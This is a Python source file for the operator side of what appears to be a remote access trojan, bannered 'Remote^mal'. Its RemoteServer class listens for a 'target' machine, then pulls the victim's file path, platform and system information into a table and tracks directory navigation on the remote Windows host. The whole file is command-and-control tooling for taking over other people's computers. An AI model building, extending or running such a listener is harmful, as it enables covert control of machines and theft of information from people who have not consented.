import socket
import os
import sys
import Load
import time
import Design
from PathLib import *

class RemoteServer(object):
    
    def __init__(self,Ip,PortId,CharSet="utf-16",Buffering=1024):
       self.Ip=Ip                   #Ipv4 Address Where  The Socket Server Need To Run
       self.PortId=PortId           #Port ID of the Socket Server Need To Run
       self.Address=(Ip,PortId)     #Address Where The Socket Sever Need To Run
       self.CharSet=CharSet         #Character Set For Encoding And Decoding
       self.Buffering=Buffering     #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)
    
    def BindServer(self):
        #Bind the serevr at the specified port
        self.server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server_socket.bind(self.Address)
        self.server_socket.listen()
        print("\n\n\x1b[0;31m <!WAITING FOR THE TARGET>...\x1b[0m")
        self.client_socket,self.client_address=self.server_socket.accept()
        print(f"\x1b[0;31mConnected To The Target Machine >>>\x1b[0m \x1b[38;5;208m<{self.client_address[0]}>Ip <{self.client_address[1]}>PortID\x1b[0m\n\n")
        return None

    def Banner(self):
        #Loads The Command Line Banner For The Tool
        print("\x1b[33m_\x1b[0m"*150)
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print(Design.logo(text="<<<Remote^mal>>>",color="red"))
        print("\x1b[33m_\x1b[0m"*150)
        print("\x1b[33m_\x1b[0m"*150)
        return None

    def send(self,data):
        #Send data as chunks 
        for i in range(0,len(data),self.Buffering):
            chunk =data[i:i+self.Buffering]
            if chunk=="EOF":
                self.client_socket.send(chunk.lower().encode(self.CharSet))
            else:
                self.client_socket.send(chunk.encode(self.CharSet))
        
        #Delay for sending data end
        time.sleep(1)
        self.client_socket.send("EOF".encode(self.CharSet))
        return None

    def recv(self):
        #recieve data as chunks
        data=""
        while True:
            chunk=self.client_socket.recv(self.Buffering).decode(self.CharSet)
            if chunk=="EOF":            #check for the <EndOfFile> to determine data end
                break
            else:
                data+=chunk
        return data

    def GetBuffer(self,flag=False):
        while(flag):
            try:
                #Change the default Buffer Size
                Buffer=input("\x1b[32m>>>Enter the Buffering Amount:\x1b[0m")
                #validating the Buffer Size
                assert (int(Buffer)<=999999999 and int(Buffer)>=1024),"\n\n \x1b[0;31m<Error>: [!]Buffer Size Cannot Be Accepted,It Should Range Between (1024 to 999999999)\x1b[0m\n\n"
                return Buffer
            except AssertionError as e:
                print(e)
        return str(self.Buffering)
    
    def SetBuffer(self):
        #Set Buffering Both Server and client Side
        try:
            if sys.argv[1]=='-b':
                Buffer=self.GetBuffer(flag=True)
            else:
                Buffer=self.GetBuffer()
        except IndexError:
                Buffer=self.GetBuffer()
        print(f"\n\x1b[32m[+]Sockets Are  Buffered with {Buffer}b For Data Transmission\x1b[0m\n")
        self.send(Buffer)
        #Change The Value Of Buffering
        self.Buffering=int(Buffer)
        return None

    def LocationOfFile(self):
        #Get The  Location of the <client>  File Downloaded Path
        self.path=self.recv()
        return None

    def SysPlatform(self):
        #Configure the System platform of the client
        #Windows - win32 , Linux -linux ,Mac -darwin
        self.platform=self.recv()
        return None
        
    def SysInfo(self):
        #Receive the system information of the client
        keys=[]
        values=[]
        Info=self.recv()
        for line in Info.splitlines():
            for data in line.split("<,>"):
                key,value=data.split(":")
                keys.append(key)
                values.append(value)
        table_data=[keys,values]
        return table_data

    def DisplaySysInfo(self,table_data):

        #Dispaly the tabular information of client system
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print(Design.logo(text=">"+self.platform,color="green"))
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print()
        print("\x1b[32m[^]System Information\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print("\x1b[0;31m"+Design.MakeTable(table_data,Design.findwidth(table_data)).draw()+"\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()
       

    def WinPathConfig(self,cmd):

        cmd=cmd.replace("/","\\")
        #Coping current path location
        self.current_path=self.path
        self.send(self.path)
        #Path configuration for directory navigation
        #Relative path navigation
        if (not isabsolute(cmd.split()[1]) and CountDirectories(cmd.split()[1])>=1):
            if (CountDirectories(self.path)>=1):
                self.path+="\\"+cmd[3:len(cmd)]
            else:
                self.path+=cmd[3:len(cmd)]

        #Absolute path navigation
        elif (isabsolute(cmd.split()[1])):
            if(CountDirectories(cmd.split()[1])>=1):
                self.path=cmd[3:len(cmd)]
            else:
                if cmd.split()[1][-1]=="\\":
                    self.path=cmd[3:len(cmd)]
                else:
                    self.path=cmd[3:len(cmd)]

        self.path=replacer(self.path)

    def WinBackDir(self,cmd):
        #return to the parent directory
        self.current_path=self.path
        # self.send(self.path)
        drive,cwd=DriveAPath(self.path)        #return the path and drive in the absolute path
        self.path=BackDir(drive,cwd,cmd.split()[1])
        
    def VerifyPath(self,stdout):
        #Validate whether the path is client's path
        if isValidPath(stdout):
            pass
        else:
            self.path=self.current_path 


if __name__=="__main__":
    r=RemoteServer("127.0.0.1",6787)
    r.Banner()
    r.BindServer()
    r.SetBuffer()
    r.LocationOfFile()
    r.SysPlatform()
    r.DisplaySysInfo(r.SysInfo())
    
   
    
